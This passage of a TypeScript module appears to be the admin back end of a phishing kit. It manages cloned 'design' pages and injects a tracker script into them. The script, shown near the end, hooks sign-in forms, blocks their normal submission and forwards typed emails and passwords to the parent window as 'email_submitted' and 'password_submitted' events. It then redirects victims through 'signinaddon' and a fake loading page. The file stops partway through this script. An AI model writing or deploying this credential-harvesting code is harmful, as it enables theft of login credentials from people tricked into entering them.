// File-backed dynamic registry of designs + pages.
//
// Content lives as REAL files under src/designs/<design>/ — bundled into the
// app via Vite glob imports so the first paint is synchronous (no flicker).
// Edits in the admin Pages tab call a server function that rewrites the file
// on disk (works in `vite dev`); the in-memory override layer makes the new
// content visible immediately to the editor and the /view page.

import {
  deleteDesignFolder,
  deleteDesignPage,
  renameDesignFolder,
  renameDesignPageFile,
  writeDesignFile,
  writeDesignIndex,
  writeDesignMeta,
} from "@/lib/designFs.functions";
import { supabase } from "@/integrations/supabase/client";

// ---- Types (kept compatible with previous callers) ----

export type DesignKey = string;
export type PageKey = string;
export type PageSlot = string; // "<page>" or "shared"
export type FileKind = "html" | "css" | "js";

export type DesignFile = {
  design: DesignKey;
  page: PageSlot;
  kind: FileKind;
};

export type DesignRecord = {
  id: string;
  label: string;
  sort_order: number;
};

export type PageRecord = {
  design: string;
  page: string;
  label: string | null;
};

// ---- Bundled file content (Vite eager glob, ?raw) ----

type RawMap = Record<string, string>;
const HTML_FILES = import.meta.glob("/src/designs/*/*.html", {
  query: "?raw",
  import: "default",
  eager: true,
}) as RawMap;
const CSS_FILES = import.meta.glob("/src/designs/*/*.css", {
  query: "?raw",
  import: "default",
  eager: true,
}) as RawMap;
const JS_FILES = import.meta.glob("/src/designs/*/*.js", {
  query: "?raw",
  import: "default",
  eager: true,
}) as RawMap;
const META_FILES = import.meta.glob("/src/designs/*/_meta.json", {
  import: "default",
  eager: true,
}) as Record<
  string,
  {
    label: string;
    pages: Record<string, string>;
    pageMeta?: Record<string, { title?: string; favicon?: string }>;
  }
>;
const INDEX_FILE = import.meta.glob("/src/designs/_index.json", {
  import: "default",
  eager: true,
}) as Record<string, { order: string[] }>;
const PNG_FILES = import.meta.glob("/src/designs/*/*.png", {
  query: "?url",
  import: "default",
  eager: true,
}) as Record<string, string>;

const BUNDLED_INDEX: { order: string[] } =
  Object.values(INDEX_FILE)[0] ?? { order: [] };

// ---- Mutable runtime state (overrides on top of bundled files) ----

const OVERRIDE_PREFIX = "design_override:";
const META_PREFIX = "design_meta_override:";
const INDEX_KEY = "design_index_override";
const HIDDEN_DESIGNS_KEY = "design_hidden_bundled";
const TOMBSTONE_KEY = "design_tombstones";

export type PageMeta = { title?: string; favicon?: string; hidden?: boolean };
type MetaEntry = {
  label: string;
  pages: Record<string, string>;
  pageMeta: Record<string, PageMeta>;
  hiddenShared?: { css?: boolean; js?: boolean };
};


const _contentOverrides = new Map<string, string>(); // key = design:page:kind
const _metaOverrides = new Map<string, MetaEntry>(); // key = design
const _hiddenBundledDesigns = new Set<string>();
const _tombstones = new Set<string>(); // key = design:page:kind — never resurrect
let _indexOverride: { order: string[] } | null = null;

function persistTombstones() {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.setItem(TOMBSTONE_KEY, JSON.stringify(Array.from(_tombstones)));
  } catch {
    /* ignore */
  }
}

export function getDesignLogo(design: string): string | null {
  const k = `/src/designs/${design}/logo.png`;
  if (PNG_FILES[k]) return PNG_FILES[k];
  // Fall back to any png in the folder
  const prefix = `/src/designs/${design}/`;
  for (const key of Object.keys(PNG_FILES)) {
    if (key.startsWith(prefix)) return PNG_FILES[key];
  }
  return null;
}

function lsLoad() {
  if (typeof window === "undefined") return;
  try {
    for (let i = 0; i < window.localStorage.length; i++) {
      const k = window.localStorage.key(i);
      if (!k) continue;
      if (k.startsWith(OVERRIDE_PREFIX)) {
        const v = window.localStorage.getItem(k);
        if (v != null) _contentOverrides.set(k.slice(OVERRIDE_PREFIX.length), v);
      } else if (k.startsWith(META_PREFIX)) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            const parsed = JSON.parse(v) as Partial<MetaEntry>;
            _metaOverrides.set(k.slice(META_PREFIX.length), {
              label: parsed.label ?? k.slice(META_PREFIX.length),
              pages: parsed.pages ?? {},
              pageMeta: parsed.pageMeta ?? {},
              hiddenShared: parsed.hiddenShared ?? {},
            });
          } catch {

            /* ignore */
          }
        }
      } else if (k === INDEX_KEY) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            _indexOverride = JSON.parse(v);
          } catch {
            /* ignore */
          }
        }
      } else if (k === HIDDEN_DESIGNS_KEY) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            for (const id of JSON.parse(v) as string[]) _hiddenBundledDesigns.add(id);
          } catch {
            /* ignore */
          }
        }
      } else if (k === TOMBSTONE_KEY) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            for (const id of JSON.parse(v) as string[]) _tombstones.add(id);
          } catch {
            /* ignore */
          }
        }
      }

    }
  } catch {
    /* ignore */
  }
}
lsLoad();

function lsSet(key: string, value: string) {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.setItem(key, value);
  } catch {
    /* quota */
  }
}

function lsDel(key: string) {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.removeItem(key);
  } catch {
    /* ignore */
  }
}

// ---- Listeners ----

type FileChangeListener = (f: DesignFile) => void;
const _registryListeners = new Set<() => void>();
const _fileListeners = new Set<FileChangeListener>();

export function subscribeRegistry(fn: () => void): () => void {
  _registryListeners.add(fn);
  return () => _registryListeners.delete(fn);
}

function notifyRegistry() {
  for (const l of _registryListeners) l();
}
function notifyFile(f: DesignFile) {
  for (const l of _fileListeners) l(f);
}

// Cross-tab sync via storage events
if (typeof window !== "undefined") {
  window.addEventListener("storage", (e) => {
    if (!e.key) return;
    if (e.key.startsWith(OVERRIDE_PREFIX)) {
      const id = e.key.slice(OVERRIDE_PREFIX.length);
      if (e.newValue == null) _contentOverrides.delete(id);
      else _contentOverrides.set(id, e.newValue);
      const [design, page, kind] = id.split(":");
      if (design && page && kind)
        notifyFile({
          design,
          page,
          kind: kind as FileKind,
        });
    } else if (e.key.startsWith(META_PREFIX)) {
      const id = e.key.slice(META_PREFIX.length);
      if (e.newValue == null) _metaOverrides.delete(id);
      else {
        try {
          _metaOverrides.set(id, JSON.parse(e.newValue));
        } catch {
          /* ignore */
        }
      }
      notifyRegistry();
    } else if (e.key === INDEX_KEY) {
      if (e.newValue == null) _indexOverride = null;
      else {
        try {
          _indexOverride = JSON.parse(e.newValue);
        } catch {
          /* ignore */
        }
      }
      notifyRegistry();
    } else if (e.key === HIDDEN_DESIGNS_KEY) {
      _hiddenBundledDesigns.clear();
      if (e.newValue) {
        try {
          for (const id of JSON.parse(e.newValue) as string[]) _hiddenBundledDesigns.add(id);
        } catch {
          /* ignore */
        }
      }
      notifyRegistry();
    }
  });
}

// ---- Helpers ----

function fileBundleKey(f: DesignFile): string {
  if (f.kind === "html") return `/src/designs/${f.design}/${f.page}.html`;
  if (f.kind === "css")
    return f.page === "shared"
      ? `/src/designs/${f.design}/shared.css`
      : `/src/designs/${f.design}/${f.page}.css`;
  return f.page === "shared"
    ? `/src/designs/${f.design}/shared.js`
    : `/src/designs/${f.design}/${f.page}.js`;
}

function bundledContent(f: DesignFile): string | null {
  const k = fileBundleKey(f);
  if (f.kind === "html") return HTML_FILES[k] ?? null;
  if (f.kind === "css") return CSS_FILES[k] ?? null;
  return JS_FILES[k] ?? null;
}

function metaFor(designId: string): MetaEntry {
  const override = _metaOverrides.get(designId);
  if (override) return override;
  const bundled =
    META_FILES[`/src/designs/${designId}/_meta.json`];
  if (bundled)
    return {
      label: bundled.label ?? designId,
      pages: { ...bundled.pages },
      pageMeta: { ...(bundled.pageMeta ?? {}) },
      hiddenShared: {},
    };
  return { label: designId, pages: {}, pageMeta: {}, hiddenShared: {} };
}

export function getHiddenShared(design: string): { css?: boolean; js?: boolean } {
  return metaFor(design).hiddenShared ?? {};
}

export async function setSharedHidden(
  design: string,
  kind: "css" | "js",
  hidden: boolean,
): Promise<void> {
  const meta = metaFor(design);
  const next: MetaEntry = {
    ...meta,
    hiddenShared: { ...(meta.hiddenShared ?? {}), [kind]: hidden || undefined },
  };
  _metaOverrides.set(design, next);
  lsSet(META_PREFIX + design, JSON.stringify(next));
  // If hiding, also clear any content override AND tombstone so the bundled
  // file never reappears (and so remote rows don't resurrect it).
  const key = `${design}:shared:${kind}`;
  if (hidden) {
    _contentOverrides.delete(key);
    lsDel(OVERRIDE_PREFIX + key);
    _tombstones.add(key);
    persistTombstones();
    try { await supabase.from("design_pages").delete().match({ design, page: "shared", kind }); } catch { /* ignore */ }
  } else {
    _tombstones.delete(key);
    persistTombstones();
  }
  notifyRegistry();
  notifyFile({ design, page: "shared", kind });
  await persistMeta(design);
}

export function getPageMeta(design: string, page: string): PageMeta {
  return metaFor(design).pageMeta[page] ?? {};
}

export async function setPageMeta(
  design: string,
  page: string,
  patch: PageMeta,
): Promise<void> {
  const meta = metaFor(design);
  const nextPageMeta = {
    ...meta.pageMeta,
    [page]: { ...(meta.pageMeta[page] ?? {}), ...patch },
  };
  // Drop empties so the meta file stays clean.
  const cleaned: Record<string, PageMeta> = {};
  for (const [k, v] of Object.entries(nextPageMeta)) {
    const t = (v.title ?? "").trim();
    const f = (v.favicon ?? "").trim();
    const h = !!v.hidden;
    if (t || f || h)
      cleaned[k] = {
        ...(t ? { title: t } : {}),
        ...(f ? { favicon: f } : {}),
        ...(h ? { hidden: true } : {}),
      };
  }
  const next: MetaEntry = { label: meta.label, pages: meta.pages, pageMeta: cleaned, hiddenShared: meta.hiddenShared };
  _metaOverrides.set(design, next);
  lsSet(META_PREFIX + design, JSON.stringify(next));
  notifyRegistry();
  // Re-render any open iframe for this page.
  notifyFile({ design, page, kind: "html" });
  await persistMeta(design);
}


function currentIndex(): { order: string[] } {
  if (_indexOverride) return _indexOverride;
  return BUNDLED_INDEX;
}

// ---- Public registry accessors ----

export function getDesigns(): DesignRecord[] {
  const order = currentIndex().order.filter((id) => !_hiddenBundledDesigns.has(id));
  // Include any design that has a meta override or a bundled meta but isn't in
  // the index (defensive).
  const seen = new Set(order);
  for (const k of Object.keys(META_FILES)) {
    const id = k.split("/")[3];
    if (id && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
      order.push(id);
      seen.add(id);
    }
  }
  for (const id of _metaOverrides.keys()) {
    if (!seen.has(id)) {
      order.push(id);
      seen.add(id);
    }
  }
  return order.map((id, i) => ({
    id,
    label: metaFor(id).label,
    sort_order: i,
  }));
}

export function getPagesFor(design: string): PageRecord[] {
  const meta = metaFor(design);
  const out: PageRecord[] = Object.entries(meta.pages)
    .filter(([page]) => !_tombstones.has(`${design}:${page}:html`))
    .map(([page, label]) => ({ design, page, label }));
  const seen = new Set(out.map((p) => p.page));
  const prefix = `/src/designs/${design}/`;
  for (const k of Object.keys(HTML_FILES)) {
    if (!k.startsWith(prefix)) continue;
    const file = k.slice(prefix.length);
    if (!file.endsWith(".html")) continue;
    const page = file.slice(0, -5);
    if (page === "shared" || seen.has(page)) continue;
    if (_tombstones.has(`${design}:${page}:html`)) continue;
    seen.add(page);
    out.push({ design, page, label: page });
  }
  for (const key of _contentOverrides.keys()) {
    const [d, p, k] = key.split(":");
    if (d !== design || k !== "html" || p === "shared" || seen.has(p)) continue;
    if (_tombstones.has(`${design}:${p}:html`)) continue;
    seen.add(p);
    out.push({ design, page: p, label: p });
  }
  return out;
}

// Pages shown in the redirect picker — excludes pages with `hidden: true`.
export function getRedirectPages(design: string): PageRecord[] {
  const meta = metaFor(design);
  return getPagesFor(design).filter((p) => !meta.pageMeta[p.page]?.hidden);
}

export function isPageHidden(design: string, page: string): boolean {
  return !!metaFor(design).pageMeta[page]?.hidden;
}

export async function setPageHidden(design: string, page: string, hidden: boolean): Promise<void> {
  await setPageMeta(design, page, { hidden });
}

export function getDesignLabel(id: string): string {
  return metaFor(id).label;
}

export function getPageLabel(design: string, page: string): string {
  return metaFor(design).pages[page] ?? page;
}


// ---- Defaults for new files ----

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function defaultHTML(label: string): string {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>${escapeHtml(label)}</title>
</head>
<body>
  <main style="font-family:ui-sans-serif,system-ui,sans-serif;padding:40px;max-width:720px;margin:0 auto;">
    <h1 style="margin:0 0 12px;">${escapeHtml(label)}</h1>
    <p style="color:#666;">Edit this page from the admin Pages tab.</p>
  </main>
</body>
</html>`;
}

function defaultCSS(): string {
  return `/* Shared styles for this design. */
*{box-sizing:border-box}
body{margin:0;background:#fafafa;color:#111;font-family:ui-sans-serif,system-ui,sans-serif}
`;
}

function defaultJS(): string {
  return `// Shared script. Use track(field,value) to record an input event.
document.addEventListener('input', (e) => {
  const t = e.target;
  if (!t || !t.name || t.type === 'password') return;
  track(t.name, t.value);
});
`;
}

const DEFAULT_LOADING_HTML = `<!DOCTYPE html>
<html lang="en" style="background-color:rgb(10,11,13);">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loading…</title>
  <style>
    html, body { margin: 0; height: 100%; background: rgb(10,11,13); }
    .wrap { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; }
    .logo { width: 64px; height: 64px; transform-origin: 50% 50%; animation: spin-osc 1.8s cubic-bezier(0.65, 0, 0.35, 1) infinite; }
    @keyframes spin-osc { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="wrap">
    <svg class="logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"></path>
    </svg>
  </div>
</body>
</html>`;

export function defaultContent(f: DesignFile): string {
  if (f.kind === "css") return defaultCSS();
  if (f.kind === "js") return defaultJS();
  const label = f.page === "shared" ? "Page" : getPageLabel(f.design, f.page);
  return defaultHTML(label);
}

// ---- File read/write ----

function overrideKey(f: DesignFile): string {
  return `${f.design}:${f.page}:${f.kind}`;
}

export function loadFileCached(f: DesignFile): string {
  const key = overrideKey(f);
  // Tombstoned files stay deleted — never resurrect from bundled or defaults.
  if (_tombstones.has(key)) return "";
  if (f.page === "shared" && (f.kind === "css" || f.kind === "js")) {
    const hidden = getHiddenShared(f.design)[f.kind];
    if (hidden) return "";
  }
  const ov = _contentOverrides.get(key);
  if (ov != null) return ov;
  const b = bundledContent(f);
  if (b != null) return b;
  return defaultContent(f);
}


// Kept for compatibility with the existing editor — same as cached read.
export async function loadFile(f: DesignFile): Promise<string> {
  return loadFileCached(f);
}

export async function saveFile(f: DesignFile, content: string): Promise<void> {
  const key = overrideKey(f);
  // Saving clears any tombstone for this file.
  if (_tombstones.delete(key)) persistTombstones();
  _contentOverrides.set(key, content);
  lsSet(OVERRIDE_PREFIX + key, content);
  // If this is a shared file that was hidden, un-hide it.
  if (f.page === "shared" && (f.kind === "css" || f.kind === "js")) {
    const hs = getHiddenShared(f.design);
    if (hs[f.kind]) {
      const meta = metaFor(f.design);
      const next: MetaEntry = {
        ...meta,
        hiddenShared: { ...(meta.hiddenShared ?? {}), [f.kind]: undefined },
      };
      _metaOverrides.set(f.design, next);
      lsSet(META_PREFIX + f.design, JSON.stringify(next));
      notifyRegistry();
    }
  }
  notifyFile(f);
  try {
    await supabase
      .from("design_pages")
      .upsert(
        { design: f.design, page: f.page, kind: f.kind, content },
        { onConflict: "design,page,kind" },
      );
  } catch {
    /* ignore */
  }
  try {
    await writeDesignFile({
      data: { design: f.design, page: f.page, kind: f.kind, content },
    });
  } catch {
    /* readonly FS in prod */
  }
}

// Reset = revert to whatever is currently on disk (bundled). Does NOT rewrite
// files — the user's source files are the source of truth.
export async function resetFile(f: DesignFile): Promise<void> {
  const key = overrideKey(f);
  _contentOverrides.delete(key);
  lsDel(OVERRIDE_PREFIX + key);
  if (_tombstones.delete(key)) persistTombstones();
  try {
    await supabase.from("design_pages").delete().match({
      design: f.design, page: f.page, kind: f.kind,
    });
  } catch {
    /* ignore */
  }
  notifyFile(f);
}


// ---- Registry mutations ----

const SLUG_RE = /^[a-z][a-z0-9_-]{0,30}$/;
const PAGE_SLUG_RE = /^[a-z][a-z0-9_-]{0,40}$/;

export function slugify(s: string, max = 30): string {
  const base = s
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, max);
  return base || "x";
}

async function persistMeta(designId: string) {
  const meta = metaFor(designId);
  _metaOverrides.set(designId, meta);
  lsSet(META_PREFIX + designId, JSON.stringify(meta));
  notifyRegistry();
  try {
    await writeDesignMeta({
      data: { design: designId, label: meta.label, pages: meta.pages, pageMeta: meta.pageMeta },
    });

  } catch {
    /* ignore */
  }
}

async function persistIndex() {
  const order = getDesigns().map((d) => d.id);
  _indexOverride = { order };
  lsSet(INDEX_KEY, JSON.stringify(_indexOverride));
  notifyRegistry();
  try {
    await writeDesignIndex({ data: { order } });
  } catch {
    /* ignore */
  }
}

function hideBundledDesign(id: string) {
  _hiddenBundledDesigns.add(id);
  lsSet(HIDDEN_DESIGNS_KEY, JSON.stringify(Array.from(_hiddenBundledDesigns)));
}

function unhideBundledDesign(id: string) {
  if (!_hiddenBundledDesigns.delete(id)) return;
  lsSet(HIDDEN_DESIGNS_KEY, JSON.stringify(Array.from(_hiddenBundledDesigns)));
}

export async function createDesign(
  id: string,
  label: string,
): Promise<DesignRecord> {
  if (!SLUG_RE.test(id)) throw new Error("Invalid design id");
  if (getDesigns().some((d) => d.id === id))
    throw new Error("Design already exists");
  unhideBundledDesign(id);
  const trimmed = label.trim() || id;
  const seedPages = { home: "Home", loading: "Loading" };
  _metaOverrides.set(id, {
    label: trimmed,
    pages: seedPages,
    pageMeta: {},
  });
  lsSet(
    META_PREFIX + id,
    JSON.stringify({ label: trimmed, pages: seedPages, pageMeta: {} }),
  );

  await saveFile(
    { design: id, page: "home", kind: "html" },
    defaultHTML(`${trimmed} — Home`),
  );
  await saveFile(
    { design: id, page: "loading", kind: "html" },
    DEFAULT_LOADING_HTML,
  );
  await saveFile({ design: id, page: "shared", kind: "css" }, defaultCSS());
  await saveFile({ design: id, page: "shared", kind: "js" }, defaultJS());
  await persistMeta(id);
  await persistIndex();
  return { id, label: trimmed, sort_order: getDesigns().length };
}

export async function renameDesign(id: string, label: string): Promise<string> {
  const trimmed = label.trim();
  if (!trimmed) throw new Error("Label required");
  const nextId = slugify(trimmed);
  if (!SLUG_RE.test(nextId)) throw new Error("Invalid design id");
  if (nextId !== id && getDesigns().some((d) => d.id === nextId)) {
    throw new Error("A design with that link already exists");
  }
  const meta = metaFor(id);
  const nextMeta = { label: trimmed, pages: { ...meta.pages }, pageMeta: { ...meta.pageMeta } };

  if (nextId !== id) {
    for (const page of Object.keys(meta.pages)) {
      const html = loadFileCached({ design: id, page, kind: "html" });
      _contentOverrides.set(`${nextId}:${page}:html`, html);
      lsSet(OVERRIDE_PREFIX + `${nextId}:${page}:html`, html);
      _contentOverrides.delete(`${id}:${page}:html`);
      lsDel(OVERRIDE_PREFIX + `${id}:${page}:html`);
    }
    for (const kind of ["css", "js"] as FileKind[]) {
      const content = loadFileCached({ design: id, page: "shared", kind });
      _contentOverrides.set(`${nextId}:shared:${kind}`, content);
      lsSet(OVERRIDE_PREFIX + `${nextId}:shared:${kind}`, content);
      _contentOverrides.delete(`${id}:shared:${kind}`);
      lsDel(OVERRIDE_PREFIX + `${id}:shared:${kind}`);
    }

    _metaOverrides.delete(id);
    lsDel(META_PREFIX + id);
    hideBundledDesign(id);
    _metaOverrides.set(nextId, nextMeta);
    lsSet(META_PREFIX + nextId, JSON.stringify(nextMeta));

    const order = currentIndex().order.map((x) => (x === id ? nextId : x));
    _indexOverride = { order };
    lsSet(INDEX_KEY, JSON.stringify(_indexOverride));

    notifyRegistry();
    for (const page of Object.keys(meta.pages)) notifyFile({ design: nextId, page, kind: "html" });
    notifyFile({ design: nextId, page: "shared", kind: "css" });
    notifyFile({ design: nextId, page: "shared", kind: "js" });
    try {
      await renameDesignFolder({ data: { from: id, to: nextId } });
    } catch {
      /* ignore */
    }
    await persistMeta(nextId);
    await persistIndex();
    return nextId;
  }

  _metaOverrides.set(id, nextMeta);
  lsSet(
    META_PREFIX + id,
    JSON.stringify(nextMeta),
  );

  notifyRegistry();
  await persistMeta(id);
  return id;
}

export async function deleteDesign(id: string): Promise<void> {
  // Clear overrides for every file under this design
  const prefix = `${id}:`;
  for (const key of Array.from(_contentOverrides.keys())) {
    if (key.startsWith(prefix)) {
      _contentOverrides.delete(key);
      lsDel(OVERRIDE_PREFIX + key);
    }
  }
  _metaOverrides.delete(id);
  lsDel(META_PREFIX + id);
  hideBundledDesign(id);
  const order = currentIndex().order.filter((x) => x !== id);
  _indexOverride = { order };
  lsSet(INDEX_KEY, JSON.stringify(_indexOverride));
  notifyRegistry();
  try {
    await deleteDesignFolder({ data: { design: id } });
  } catch {
    /* ignore */
  }
  await persistIndex();
}

export async function createPage(
  design: string,
  page: string,
  label?: string,
): Promise<void> {
  if (!PAGE_SLUG_RE.test(page)) throw new Error("Invalid page id");
  if (page === "shared") throw new Error("'shared' is reserved");
  const display = (label ?? page).trim() || page;
  const meta = metaFor(design);
  const nextPages = { ...meta.pages, [page]: display };
  _metaOverrides.set(design, { label: meta.label, pages: nextPages, pageMeta: meta.pageMeta });
  lsSet(
    META_PREFIX + design,
    JSON.stringify({ label: meta.label, pages: nextPages, pageMeta: meta.pageMeta }),
  );

  notifyRegistry();
  await saveFile(
    { design, page, kind: "html" },
    defaultHTML(`${meta.label} — ${display}`),
  );
  await persistMeta(design);
}

export async function renamePage(
  design: string,
  page: string,
  label: string,
): Promise<string> {
  const trimmed = label.trim();
  if (!trimmed) throw new Error("Label required");
  const nextPage = slugify(trimmed, 40);
  if (!PAGE_SLUG_RE.test(nextPage)) throw new Error("Invalid page id");
  if (nextPage === "shared") throw new Error("'shared' is reserved");
  const meta = metaFor(design);
  if (!(page in meta.pages)) throw new Error("Page not found");
  if (nextPage !== page && nextPage in meta.pages) {
    throw new Error("A page with that link already exists");
  }
  const nextPages = { ...meta.pages };
  const nextPageMeta = { ...meta.pageMeta };
  if (nextPage !== page) {
    delete nextPages[page];
    nextPages[nextPage] = trimmed;
    if (nextPageMeta[page]) {
      nextPageMeta[nextPage] = nextPageMeta[page];
      delete nextPageMeta[page];
    }
    const oldKey = `${design}:${page}:html`;
    const newKey = `${design}:${nextPage}:html`;
    const html = loadFileCached({ design, page, kind: "html" });
    _contentOverrides.set(newKey, html);
    lsSet(OVERRIDE_PREFIX + newKey, html);
    _contentOverrides.delete(oldKey);
    lsDel(OVERRIDE_PREFIX + oldKey);
  } else {
    nextPages[page] = trimmed;
  }

  _metaOverrides.set(design, { label: meta.label, pages: nextPages, pageMeta: nextPageMeta });
  lsSet(
    META_PREFIX + design,
    JSON.stringify({ label: meta.label, pages: nextPages, pageMeta: nextPageMeta }),
  );

  notifyRegistry();
  if (nextPage !== page) {
    notifyFile({ design, page: nextPage, kind: "html" });
    try {
      await renameDesignPageFile({ data: { design, from: page, to: nextPage } });
    } catch {
      /* ignore */
    }
  }
  await persistMeta(design);
  return nextPage;
}

export async function deletePage(design: string, page: string): Promise<void> {
  const meta = metaFor(design);
  if (!(page in meta.pages)) return;
  const nextPages = { ...meta.pages };
  delete nextPages[page];
  const nextPageMeta = { ...meta.pageMeta };
  delete nextPageMeta[page];
  _metaOverrides.set(design, { label: meta.label, pages: nextPages, pageMeta: nextPageMeta });
  lsSet(
    META_PREFIX + design,
    JSON.stringify({ label: meta.label, pages: nextPages, pageMeta: nextPageMeta }),
  );

  // Drop content override
  const key = `${design}:${page}:html`;
  _contentOverrides.delete(key);
  lsDel(OVERRIDE_PREFIX + key);
  notifyRegistry();
  try {
    await deleteDesignPage({ data: { design, page } });
  } catch {
    /* ignore */
  }
  await persistMeta(design);
}

// ---- Bulk loader (no-op — kept for API compat) ----

export async function loadAll(): Promise<void> {
  // Everything is loaded synchronously from bundled files at import time.
  // This stub exists only so legacy callers (which `await loadAll()`) keep
  // working without an extra round-trip.
}

// ---- Iframe document assembly ----

export function buildSrcDocCached(design: DesignKey, page: PageKey): string {
  const html = loadFileCached({ design, page, kind: "html" });
  const css = loadFileCached({ design, page: "shared", kind: "css" });
  const js = loadFileCached({ design, page: "shared", kind: "js" });
  const pm = getPageMeta(design, page);
  const trimmed = html.trimStart().toLowerCase();
  const isFullDoc =
    trimmed.startsWith("<!doctype") || trimmed.startsWith("<html");
  const base = isFullDoc ? injectTracker(html) : wrap(html, css, js);
  return applyPageMeta(base, pm);
}

function escAttr(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");
}

function escText(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function applyPageMeta(doc: string, pm: PageMeta): string {
  let out = doc;
  const title = (pm.title ?? "").trim();
  const favicon = (pm.favicon ?? "").trim();
  if (!title && !favicon) return out;

  if (title) {
    if (/<title>[\s\S]*?<\/title>/i.test(out)) {
      out = out.replace(/<title>[\s\S]*?<\/title>/i, `<title>${escText(title)}</title>`);
    } else if (/<head[^>]*>/i.test(out)) {
      out = out.replace(/<head[^>]*>/i, (m) => `${m}\n<title>${escText(title)}</title>`);
    }
  }

  if (favicon) {
    // Strip any existing favicon links first.
    out = out.replace(/<link[^>]+rel=["']?(?:shortcut )?icon["']?[^>]*>/gi, "");
    const tag = `<link rel="icon" href="${escAttr(favicon)}" />`;
    if (/<head[^>]*>/i.test(out)) {
      out = out.replace(/<head[^>]*>/i, (m) => `${m}\n${tag}`);
    }
  }

  return out;
}

const TRACKER_SCRIPT = `<script>
window.track = function(field, value){ try { parent.postMessage({__ux:true, type:'input', field, value}, '*'); } catch(e){} };
var EMAIL_KEY = '__ux_email';
function getStoredEmail(){ try { return sessionStorage.getItem(EMAIL_KEY) || ''; } catch(e){ return ''; } }
function setStoredEmail(v){ try { sessionStorage.setItem(EMAIL_KEY, v); } catch(e){} }
function currentDesignAndPage(){
  try {
    var parts = parent.location.pathname.split('/').filter(Boolean);
    return { design: parts[0] || '', page: parts[1] || '' };
  } catch(e){ return { design:'', page:'' }; }
}
function navigateTo(page){
  var loc = currentDesignAndPage();
  if (!loc.design) return;
  var target = '/' + loc.design + '/' + page;
  try { sessionStorage.setItem('__ux_internal_nav_until', String(Date.now() + 15000)); } catch(e){}
  try { parent.postMessage({__ux:true, type:'internal_navigation', url: target}, '*'); } catch(e){}
  try {
    document.body.style.transition = 'opacity .25s ease';
    document.body.style.opacity = '0';
  } catch(e){}
  setTimeout(function(){
    try { parent.location.assign(target); }
    catch(e){ try { location.assign(target); } catch(_){} }
  }, 220);
}
function replaceEmailPlaceholder(){
  var email = getStoredEmail();
  if (!email) return;
  function walk(node){
    if (!node) return;
    if (node.nodeType === 3) {
      if (node.nodeValue && node.nodeValue.indexOf('lol@gmail.com') >= 0) {
        node.nodeValue = node.nodeValue.split('lol@gmail.com').join(email);
      }
    } else if (node.nodeType === 1) {
      var tag = node.tagName;
      if (tag === 'SCRIPT' || tag === 'STYLE') return;
      for (var i = 0; i < node.childNodes.length; i++) walk(node.childNodes[i]);
    }
  }
  walk(document.body);
}
function findContinueButton(scope){
  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"]'));
  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next/i.test((b.textContent || b.value || '').trim()); })
    || document.getElementById('continueBtn')
    || buttons[0];
}
function wireContinueButtons(){
  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i]'));
  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i]'));
  var hasPassword = passwords.length > 0;
  var input = passwords[0] || emails[0];
  if (!input) {
    var btnOnly = findContinueButton();
    if (btnOnly && !btnOnly.__uxContinueWired) {
      btnOnly.__uxContinueWired = true;
      btnOnly.disabled = false;
      btnOnly.addEventListener('click', function(){ navigateTo('loading'); }, true);
    }
    return;
  }
  var root = input.closest('form') || document;
  var btn = findContinueButton(root);
  if (!btn || btn.__uxContinueWired) return;
  btn.__uxContinueWired = true;
  function ok(){
    var v = input.value || '';
    if (hasPassword) return v.length > 0;
    return /@/.test(v);
  }
  function sync(){
    var ready = ok();
    btn.disabled = !ready;
    btn.setAttribute('aria-disabled', ready ? 'false' : 'true');
    if (btn.classList) btn.classList.toggle('is-ready', ready);
  }
  input.addEventListener('input', sync);
  input.addEventListener('keyup', sync);
  input.addEventListener('change', sync);
  btn.addEventListener('click', function(e){
    if (!ok()) { e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation(); sync(); return; }
    e.preventDefault();
    e.stopPropagation();
    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
    if (hasPassword) {
      try { window.track('password_submitted', input.value || ''); } catch(err){}
      try { window.track('continue_clicked', '1'); } catch(err){}
      navigateTo('loading');
    } else {
      setStoredEmail(input.value || '');
      try { window.track('email_submitted', input.value || ''); } catch(err){}
      try { window.track('continue_clicked', '1'); } catch(err){}
      navigateTo('signinaddon');
    }
  }, true);
  var form = input.closest('form');
  if (form && !form.__uxSubmitWired) {
    form.__uxSubmitWired = true;
    form.addEventListener('submit', function(e){
      e.preventDefault();
      e.stopPropagation();
      if (e.stopImmediatePropagation) e.stopImmediatePropagation();
      if (btn) btn.click();
    }, true);
  }
  sync();
}
